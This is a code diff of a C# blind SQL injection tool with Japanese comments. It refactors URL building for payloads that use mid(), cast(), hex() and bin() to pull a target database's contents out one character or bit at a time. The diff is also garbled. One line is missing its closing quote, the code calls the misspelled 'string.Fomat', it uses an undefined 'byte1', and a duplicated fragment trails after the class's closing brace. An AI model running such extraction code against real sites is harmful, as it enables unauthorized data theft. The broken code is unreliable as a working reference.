@@ -16,7 +16,7 @@ public class Test
 	private static var client = new HttpClient();
 	
 	private static string CraftURL(string url, string query_format, string query){
-		return string.Format("{0}?{1}", url, string.Format(query_format, $"mid(cast({target_query} as char),{index},1)=''"));
+		return $"{url}?{string.Format(query_format, query)};
 	}
 	
 	private static async Task<string> _get_html(string url){
@@ -31,12 +31,12 @@ public class Test
 		int index = 1;
 		while(true){
 			//全桁見たかチェック
-			string test_url = string.Format("{0}?{1}", url, string.Format(query_format, $"mid(cast({target_query} as char),{index},1)=''"));
+			string test_url = CraftURL(url, query_format, $"mid(cast({target_query} as char),{index},1)=''");
 			string html = await _get_html(test_url);
 			if(check_func(html)) break;
 			//現在の桁の数字を取得
 			for(int i = 0x30; i < 0x40; i++){
-				test_url = string.Format("{0}?{1}", url, string.Format(query_format, $"mid(cast({target_query} as char),{index},1)=0x" + i.ToString("X2")));
+				test_url = CraftURL(url, query_format, $"mid(cast({target_query} as char),{index},1)=0x" + i.ToString("X2"));
 				html = await client.GetStringAsync(test_url);
 				if(check_func(html)){
 					result_s += (char)i;
@@ -66,7 +66,12 @@ public class Test
 		for(int i = 1; i <= length; i++){
 			byte buf = 0x00;
 			for(int j = 1; j <= 8; j++)
-				buf = (buf << 1) | check_func(await _get_html(string.Format("{0}?{1}", url, string.Fomat(query_format, $"mid(bin(mid(hex({query}),{2 * i - 1})),{j},1)"))));
+				buf = (buf << 1) | check_func(await _get_html(CraftURL(url, query_format, $"mid(bin(mid(hex({query}),{2 * i - 1})),{j},1)")));
+			result.Add(Convert.ToInt16(byte1, 2));
+		}
+		return encoding.GetString(result.ToArray());
+	}
+} $"mid(bin(mid(hex({query}),{2 * i - 1})),{j},1)"))));
 			result.Add(Convert.ToInt16(byte1, 2));
 		}
 		return encoding.GetString(result.ToArray());
